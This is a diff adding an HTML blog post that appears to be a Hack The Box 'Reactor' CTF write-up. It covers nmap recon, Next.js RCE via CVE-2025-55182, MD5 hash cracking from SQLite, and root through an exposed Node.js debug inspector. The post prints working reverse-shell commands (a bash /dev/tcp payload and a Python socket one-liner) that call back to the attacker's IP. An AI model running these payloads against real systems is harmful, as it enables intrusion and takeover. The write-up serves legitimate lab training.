@@ -1,0 +1,371 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="description" content="HTB Reactor writeup — unauthenticated RCE via CVE-2025-55182 (React2Shell) on a Next.js app, SQLite credential recovery, and root via an exposed Node.js debug inspector." />
+  <title>HTB: Reactor | 18gi0n</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500&display=swap" rel="stylesheet" />
+  <link rel="stylesheet" href="/styles.css" />
+  <link rel="icon" type="image/x-icon" href="/assets/images/racoon.ico" />
+</head>
+<body>
+
+  <nav class="navbar">
+    <div class="nav-container">
+      <a href="/index.html" class="nav-logo">18gi0n</a>
+      <button class="nav-toggle" id="navToggle" aria-label="Toggle menu">
+        <span></span><span></span><span></span>
+      </button>
+      <ul class="nav-links" id="navLinks">
+        <li><a href="/index.html">Home</a></li>
+        <li><a href="/blog.html">Blog</a></li>
+        <li><a href="/projects.html">Projects</a></li>
+        <li><a href="/code.html">Code &amp; Tools</a></li>
+        <li><a href="/about.html">About</a></li>
+      </ul>
+    </div>
+  </nav>
+
+  <header class="post-header">
+    <a href="/blog.html" class="back-link">&larr; All Posts</a>
+    <h1>HTB: Reactor</h1>
+    <div class="post-meta">
+      <span class="badge badge-ctf">CTF</span>
+      <span class="reading-time" id="readingTime"></span>
+    </div>
+  </header>
+
+  <nav class="toc" id="toc">
+    <div class="toc-title">// Contents</div>
+    <ol id="tocList"></ol>
+  </nav>
+
+  <article class="post-body" id="postBody">
+
+    <img src="/assets/images/reactor/title.png" alt="HTB Reactor machine card" />
+
+    <p>
+      <strong>Difficulty:</strong> Easy &nbsp;|&nbsp; <strong>OS:</strong> Linux<br />
+      <strong>Box:</strong> <a href="https://app.hackthebox.com/machines/Reactor" target="_blank" rel="noopener">app.hackthebox.com/machines/Reactor</a>
+    </p>
+
+    <h2>Overview</h2>
+
+    <p>
+      Reactor is an easy Linux box themed around a fictional nuclear reactor monitoring dashboard,
+      "ReactorWatch." The path to root runs through a recently disclosed unauthenticated RCE in a
+      Next.js/React application (<strong>CVE-2025-55182</strong>, "React2Shell"), credential recovery
+      from a local SQLite database, and privilege escalation via an exposed Node.js debug inspector
+      running as root.
+    </p>
+
+    <h2>Reconnaissance</h2>
+
+    <p>Started with a standard TCP port scan:</p>
+
+<pre><code>nmap -Pn -n -sS -T4 10.129.245.214 --open</code></pre>
+
+<pre><code>PORT     STATE SERVICE
+22/tcp   open  ssh
+3000/tcp open  ppp</code></pre>
+
+    <p>
+      Only two ports open: SSH (22) and something on 3000 that nmap's default service signatures
+      misidentified as <code>ppp</code>. Followed up with a version/script scan against both:
+    </p>
+
+<pre><code>nmap -Pn -sV -sC -p 22,3000 10.129.245.214</code></pre>
+
+<pre><code>22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
+3000/tcp open  ppp?
+| fingerprint-strings:
+|   GetRequest:
+|     HTTP/1.1 200 OK
+|     Vary: RSC, Next-Router-State-Tree, Next-Router-Prefetch, ...</code></pre>
+
+    <p>
+      The <code>Vary</code> header values (<code>RSC</code>, <code>Next-Router-State-Tree</code>, etc.)
+      are a dead giveaway for a <strong>Next.js</strong> application, even though nmap's service
+      database mislabeled the port. Worth remembering that nmap's <code>ppp?</code> guess here was
+      simply wrong — always confirm with a browser or curl when a service fingerprint looks off.
+    </p>
+
+    <h2>Web Enumeration</h2>
+
+    <p>
+      Pulling up <code>http://10.129.245.214:3000/</code> in a browser revealed a dark-themed
+      monitoring dashboard:
+    </p>
+
+    <img src="/assets/images/reactor/1.png" alt="ReactorWatch dashboard UI" />
+
+    <p>The page title and meta description confirmed the theme:</p>
+
+<pre><code>Title: ReactorWatch | Core Monitoring System
+Description: Nuclear Reactor Core Monitoring Dashboard</code></pre>
+
+    <p>
+      The UI itself was entirely read-only — no clickable links, no forms, no other reachable pages
+      from the dashboard alone. Just live(ish) visualizations of reactor stats, system logs, and
+      on-site personnel. Response headers were unremarkable — no leaked internal hostnames, no debug
+      headers, nothing unusual.
+    </p>
+
+    <p>Fingerprinting the stack with <code>whatweb</code> confirmed the framework and version:</p>
+
+<pre><code>whatweb http://10.129.245.214:3000/</code></pre>
+
+<pre><code>http://10.129.245.214:3000/ [200 OK] HTML5, Script,
+Title[ReactorWatch | Core Monitoring System],
+UncommonHeaders[x-nextjs-cache,x-nextjs-prerender,x-nextjs-stale-time],
+X-Powered-By[Next.js]</code></pre>
+
+    <p>The rendered page source also leaked an internal version string:</p>
+
+    <img src="/assets/images/reactor/2.png" alt="CORE MONITORING SYSTEM v3.2.1 version string in page source" />
+
+<pre><code class="language-html">&lt;span&gt;CORE MONITORING SYSTEM v3.2.1&lt;/span&gt;</code></pre>
+
+    <h2>Exploitation — CVE-2025-55182 (React2Shell)</h2>
+
+    <p>
+      With Next.js confirmed, a quick search for recent React/Next.js vulnerabilities turned up
+      <strong>CVE-2025-55182</strong>, an unauthenticated RCE affecting React Server Components,
+      publicly nicknamed "React2Shell." A public PoC and scanner were available on GitHub.
+    </p>
+
+    <p>Ran the scanner against the target:</p>
+
+<pre><code>python3 scanner.py -u http://10.129.33.66:3000</code></pre>
+
+<pre><code>[*] Using RCE PoC check
+[VULNERABLE] http://10.129.33.66:3000 - Status: 303</code></pre>
+
+    <p>
+      Confirmed vulnerable. The default PoC targeted port 443 — had to adjust the script to target
+      port 3000 instead before it would work correctly against this host.
+    </p>
+
+    <p>Once patched up, confirmed code execution:</p>
+
+<pre><code>python3 main.py http://10.129.33.66:3000 'id'</code></pre>
+
+<pre><code>[+] Command output:
+uid=999(node) gid=988(node) groups=988(node)</code></pre>
+
+    <p>Unauthenticated RCE confirmed, running as the low-privileged <code>node</code> user.</p>
+
+    <h2>Gaining a Stable Shell</h2>
+
+    <p>
+      The PoC's command execution worked but was single-shot — every command was a fresh,
+      non-interactive request/response. Various reverse shell one-liners (via
+      <a href="https://www.revshells.com/" target="_blank" rel="noopener">revshells.com</a>) failed to
+      connect back directly through this execution method.
+    </p>
+
+    <p>Worked around it by staging a payload file via HTTP and pulling it down with <code>curl</code>:</p>
+
+    <p><strong>1. Hosted a payload locally:</strong></p>
+
+<pre><code>python3 -m http.server 8000</code></pre>
+
+    <p><code>payload.sh</code>:</p>
+
+<pre><code class="language-bash">#!/bin/bash
+bash -i >& /dev/tcp/10.10.14.117/9005 0>&1</code></pre>
+
+    <p><strong>2. Pulled it onto the target via the RCE:</strong></p>
+
+<pre><code>curl http://10.10.14.117:8000/payload.sh -o /opt/reactor-app/payload.sh
+chmod +x payload.sh</code></pre>
+
+    <p><strong>3. Started a listener and triggered execution:</strong></p>
+
+<pre><code>nc -lvnp 9005</code></pre>
+
+<pre><code>./payload.sh</code></pre>
+
+    <img src="/assets/images/reactor/3.png" alt="Reverse shell callback — node user" />
+
+<pre><code>connect to [10.10.14.117] from (UNKNOWN) [10.129.33.66] 39590
+bash: cannot set terminal process group (1392): Inappropriate ioctl for device
+bash: no job control in this shell
+node@reactor:/opt/reactor-app$</code></pre>
+
+    <p>Interactive(ish) shell as <code>node</code> established.</p>
+
+    <h2>Credential Discovery</h2>
+
+    <p>Inside the application directory sat a SQLite database:</p>
+
+<pre><code>node@reactor:/opt/reactor-app$ ls
+app  next.config.js  node_modules  package.json  package-lock.json  payload.sh  reactor.db</code></pre>
+
+<pre><code>file reactor.db
+reactor.db: SQLite 3.x database, last written using SQLite version 3045001, ...</code></pre>
+
+    <p>
+      Two user home directories existed on the box (<code>/home/engineer</code>,
+      <code>/home/node</code>), so finding credentials here was promising. Opened it up:
+    </p>
+
+<pre><code>sqlite3 reactor.db
+sqlite> .tables
+sensor_logs  users
+sqlite> SELECT * FROM users;</code></pre>
+
+<pre><code>1|admin|a203b22191d744a4e70ada5c101b17b8|administrator|admin@reactor.htb
+2|engineer|39d97110eafe2a9a68639812cd271e8e|operator|engineer@reactor.htb</code></pre>
+
+    <p>
+      Two password hashes recovered. Identified the format with <code>hashid</code> — top match:
+      <strong>MD5</strong>. Ran the <code>engineer</code> hash through CrackStation:
+    </p>
+
+    <img src="/assets/images/reactor/4.png" alt="CrackStation — engineer hash cracked" />
+
+<pre><code>39d97110eafe2a9a68639812cd271e8e → reactor1</code></pre>
+
+    <p>Cracked credentials: <code>engineer:reactor1</code>.</p>
+
+    <h2>Foothold — User Flag</h2>
+
+    <p>The cracked credentials worked directly over SSH:</p>
+
+<pre><code>ssh engineer@10.129.33.66</code></pre>
+
+<pre><code>   ReactorWatch Core Monitoring System
+   Nuclear Dynamics Corp. - Site 7
+   AUTHORIZED PERSONNEL ONLY</code></pre>
+
+    <p>User flag retrieved.</p>
+
+    <h2>Privilege Escalation</h2>
+
+    <p>Started with the basics — current group memberships:</p>
+
+<pre><code>id</code></pre>
+
+<pre><code>uid=1000(engineer) gid=1000(engineer)
+groups=1000(engineer),4(adm),24(cdrom),30(dip),46(plugdev),101(lxd)</code></pre>
+
+    <p>A few groups stood out:</p>
+
+    <table>
+      <thead>
+        <tr><th>Group</th><th>Relevance</th></tr>
+      </thead>
+      <tbody>
+        <tr><td><code>adm</code></td><td>Read access to system logs in <code>/var/log</code></td></tr>
+        <tr><td><code>cdrom</code></td><td>Optical media access — not relevant here</td></tr>
+        <tr><td><code>dip</code></td><td>Legacy dial-up/PPP group — not relevant here</td></tr>
+        <tr><td><code>plugdev</code></td><td>Removable media access — not relevant here</td></tr>
+        <tr><td><code>lxd</code></td><td>Known container-based privesc vector</td></tr>
+      </tbody>
+    </table>
+
+    <h3>Dead end: LXD</h3>
+
+    <p>
+      <code>lxd</code> group membership is a textbook privesc path (mount the host filesystem into a
+      privileged container). However, on this box:
+    </p>
+
+    <ul>
+      <li>LXD/LXC was not actually installed — only a stub wrapper package (<code>lxd-installer</code>) that bootstraps the real thing via snap on first run.</li>
+      <li>The snap install failed outright — the box has <strong>no outbound internet access</strong>, so it couldn't reach the snap store.</li>
+      <li><code>sudo -l</code> confirmed <code>engineer</code> has <strong>no sudo rights at all</strong>, ruling out a manual/sideloaded snap install too.</li>
+    </ul>
+
+    <p>
+      This path was a dead end in this environment, despite being a legitimate technique in general.
+      Worth remembering: group membership alone doesn't guarantee the tooling is actually present or
+      usable.
+    </p>
+
+    <h3>SUID / capabilities / cron — nothing notable</h3>
+
+    <p>Standard checks turned up nothing custom or exploitable:</p>
+
+<pre><code>getcap -r / 2>/dev/null
+find / -perm -4000 -type f 2>/dev/null
+cat /etc/crontab</code></pre>
+
+    <p>All standard system binaries and default cron entries — no leads here.</p>
+
+    <h3>The real lead: exposed Node.js debug inspector</h3>
+
+    <p>Checked listening sockets:</p>
+
+<pre><code>ss -tulpn</code></pre>
+
+<pre><code>tcp   LISTEN   0   511   127.0.0.1:9229   0.0.0.0:*</code></pre>
+
+    <p>
+      Port <strong>9229</strong> is the default Node.js V8 Inspector debug port. A quick check of
+      running processes confirmed who was listening on it:
+    </p>
+
+<pre><code>ps -ef | grep node</code></pre>
+
+<pre><code>node   1392   1   0 20:18 ?   00:00:19 next-server (v15.0.3)
+root   1394   1   0 20:18 ?   00:00:01 /usr/bin/node --inspect=127.0.0.1:9229 /opt/uptime-monitor/worker.js</code></pre>
+
+    <p>
+      A second, separate Node process (<code>/opt/uptime-monitor/worker.js</code>) was running
+      <strong>as root</strong>, with the debug inspector explicitly bound to localhost. Since
+      <code>engineer</code> already has local access to the box, this is directly reachable.
+    </p>
+
+    <h2>Root via Node Inspector RCE</h2>
+
+    <p>
+      The V8 Inspector protocol allows arbitrary JavaScript execution in the context of the attached
+      process — meaning code run through it executes with that process's privileges (root, in this
+      case).
+    </p>
+
+    <p>Connected to the inspector:</p>
+
+<pre><code>node inspect 127.0.0.1:9229</code></pre>
+
+<pre><code>connecting to 127.0.0.1:9229 ... ok
+debug></code></pre>
+
+    <p>From the debug console, used <code>child_process.exec()</code> to spawn a reverse shell:</p>
+
+<pre><code class="language-js">exec("process.mainModule.require('child_process').exec('python3 -c \\'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"10.10.14.117\\\",8008));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\\\"/bin/sh\\\",\\\"-i\\\"])\\'')")</code></pre>
+
+    <p>Caught the callback on a waiting listener:</p>
+
+<pre><code>nc -lnvp 8008</code></pre>
+
+<pre><code>connect to [10.10.14.117] from (UNKNOWN) [10.129.33.66] 50448
+/bin/sh: 0: can't access tty; job control turned off
+# id
+uid=0(root) gid=0(root) groups=0(root)</code></pre>
+
+    <img src="/assets/images/reactor/5.png" alt="Root shell — uid=0(root)" />
+
+    <p>Root shell obtained. Root flag retrieved.</p>
+
+    <img src="/assets/images/reactor/complete.png" alt="HTB Reactor — machine owned" />
+
+    <h2>Lessons Learned</h2>
+
+    <ul>
+      <li>Don't trust nmap's service-name guesses (<code>ppp?</code>) blindly — always confirm with a browser or manual probe.</li>
+      <li>Recently disclosed CVEs against modern frameworks (Next.js/React here) are worth checking against any unfamiliar app version found during recon, especially on freshly published boxes.</li>
+      <li>When a direct reverse shell payload won't connect back through a one-shot RCE primitive, staging via HTTP server + curl is a reliable fallback.</li>
+      <li>Group memberships (<code>lxd</code>, <code>adm</code>, etc.) are useful signal but not guaranteed wins — verify the actual tooling and permissions are present before sinking time into a path.</li>
+      <li>Always enumerate listening sockets, not just well-known ports. An internal-only debug port (9229) running as root was the real privesc path here — easy to miss if you only chase group memberships.</li>
+    </ul>
+
+  </article>
+
+  <script src="/assets/js/post.js"></script>
+</body>
+</html>
